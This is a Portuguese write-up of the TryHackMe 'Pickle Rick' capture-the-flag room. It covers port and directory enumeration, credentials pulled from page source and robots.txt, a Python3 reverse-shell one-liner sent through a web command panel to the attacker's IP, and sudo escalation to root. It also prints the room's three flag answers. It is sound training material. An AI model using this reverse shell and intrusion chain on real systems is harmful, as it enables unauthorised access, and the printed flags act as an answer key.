<p align="center">
  <img src="pickle-rick.png" alt="Pickle Rick — TryHackMe" width="320">
</p>
# Pickle Rick — TryHackMe | Write-up
 
> Walkthrough / anotações da resolução da sala **Pickle Rick** do TryHackMe.
> Objetivo: explorar uma aplicação web para obter execução de comandos, conseguir um shell
> e coletar os **3 ingredientes (flags)** para o Rick voltar ao normal.
 
**Autor:** Matheus Campos Pereira
 
---
 
## Índice
 
1. [Informações do alvo](#informações-do-alvo)
2. [Metodologia](#metodologia)
3. [Fase 1 — Reconhecimento e Enumeração](#fase-1--reconhecimento-e-enumeração)
   - [1.1 Scan de portas e serviços (Nmap)](#11-scan-de-portas-e-serviços-nmap)
   - [1.2 Enumeração web (Gobuster)](#12-enumeração-web-gobuster)
   - [1.3 Coleta de credenciais](#13-coleta-de-credenciais)
4. [Fase 2 — Acesso Inicial (Foothold)](#fase-2--acesso-inicial-foothold)
   - [2.1 Login no portal](#21-login-no-portal)
   - [2.2 Reverse shell](#22-reverse-shell)
5. [Fase 3 — Coleta das Flags e Escalonamento](#fase-3--coleta-das-flags-e-escalonamento)
   - [3.1 Flag 1 — painel de comandos](#31-flag-1--painel-de-comandos)
   - [3.2 Flag 2 — diretório do rick](#32-flag-2--diretório-do-rick)
   - [3.3 Flag 3 — escalonamento para root](#33-flag-3--escalonamento-para-root)
6. [Resumo das flags](#resumo-das-flags)
7. [Ferramentas utilizadas](#ferramentas-utilizadas)
---
 
## Informações do alvo
 
| Item              | Valor            |
|-------------------|------------------|
| **IP do alvo**    | `10.67.148.199`  |
| **IP do atacante**| `10.67.117.243`  |
| **Sala**          | Pickle Rick      |
| **Plataforma**    | TryHackMe        |
| **Dificuldade**   | Easy · 30 min    |
 
---
 
## Metodologia
 
```
Reconhecimento → Enumeração Web → Credenciais → Execução de Comandos (RCE) → Reverse Shell → Coleta de Flags → Root
```
 
---
 
## Fase 1 — Reconhecimento e Enumeração
 
### 1.1 Scan de portas e serviços (Nmap)
 
```bash
nmap -sC -sV 10.67.148.199
```
 
**Serviços expostos:**
 
| Porta  | Serviço | Descrição        |
|--------|---------|------------------|
| 22/tcp | ssh     | Acesso remoto SSH|
| 80/tcp | http    | Servidor web     |
 
### 1.2 Enumeração web (Gobuster)
 
```bash
gobuster dir -u http://10.67.148.199/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html
```
 
**Resultados relevantes:**
 
| Caminho          | Status | Observação                                  |
|------------------|--------|---------------------------------------------|
| `/index.html`    | 200    | Página inicial                              |
| `/login.php`     | 200    | Tela de login                               |
| `/portal.php`    | 302 → `/login.php` | Painel protegido (exige login)  |
| `/denied.php`    | 302 → `/login.php` | Página de acesso negado         |
| `/assets`        | 301    | Diretório de assets                         |
| `/robots.txt`    | 200    | Contém pista                                |
| `/clue.txt`      | 200    | Dica adicional                              |
| `/server-status` | 403    | Acesso proibido                             |
 
### 1.3 Coleta de credenciais
 
**Usuário** — encontrado no código-fonte da página inicial (`Ctrl+U` / view-source):
 
```
Username: R1ckRul3s
```
 
**Senha** — encontrada no `robots.txt`:
 
```bash
curl http://10.67.148.199/robots.txt
```
 
```
Password: Wubbalubbadubdub
```
 
---
 
## Fase 2 — Acesso Inicial (Foothold)
 
### 2.1 Login no portal
 
Com as credenciais em mãos, autenticação em `/login.php` libera o acesso a `/portal.php`,
que contém um **Command Panel** (campo que executa comandos no servidor → RCE).
 
| Campo    | Valor              |
|----------|--------------------|
| Username | `R1ckRul3s`        |
| Password | `Wubbalubbadubdub` |
 
### 2.2 Reverse shell
 
Na máquina de ataque, abrir um listener:
 
```bash
nc -lvnp 9001
```
 
No **Command Panel** de `/portal.php`, enviar o payload de reverse shell em Python3:
 
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.67.117.243",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
```
 
> O alvo conecta de volta no listener → shell interativo obtido como `www-data`.
 
---
 
## Fase 3 — Coleta das Flags e Escalonamento
 
### 3.1 Flag 1 — painel de comandos
 
Listando o diretório web pelo painel de comandos, aparece o arquivo do **1º ingrediente**:
 
```
Flag 1 (1st ingredient): mr. meeseek hair
```
 
### 3.2 Flag 2 — diretório do rick
 
Já com o shell, navegar até o home do usuário `rick` e ler o arquivo do **2º ingrediente**:
 
```bash
cd /home/rick
cat 'second ingredients'
```
 
```
Flag 2 (2nd ingredient): 1 jerry tear
```
 
### 3.3 Flag 3 — escalonamento para root
 
O usuário `www-data` possui permissão de `sudo`. Escalonando para root:
 
```bash
sudo -i
 
ls
# 3rd.txt  snap
 
cat 3rd.txt
```
 
```
Flag 3 (3rd ingredient): fleeb juice
```
 
Acesso **root** obtido e os 3 ingredientes coletados. ✅
 
---
 
## Resumo das flags
 
| # | Ingrediente (flag)    | Onde foi encontrada                          |
|---|-----------------------|----------------------------------------------|
| 1 | `mr. meeseek hair`    | Painel de comandos em `/portal.php`          |
| 2 | `1 jerry tear`        | `/home/rick/second ingredients`              |
| 3 | `fleeb juice`         | `/root/3rd.txt` (após `sudo -i`)             |
 
### Credenciais utilizadas
 
| Usuário     | Senha               | Origem                           |
|-------------|---------------------|----------------------------------|
| `R1ckRul3s` | `Wubbalubbadubdub`  | Código-fonte + `robots.txt`      |
 
---
 
## Ferramentas utilizadas
 
- **Nmap** — scan de portas e detecção de serviços/versões
- **Gobuster** — enumeração de diretórios e arquivos web
- **curl / view-source (Ctrl+U)** — inspeção de `robots.txt` e código-fonte
- **Netcat (nc)** — listener para o reverse shell
- **Python3** — payload de reverse shell
 
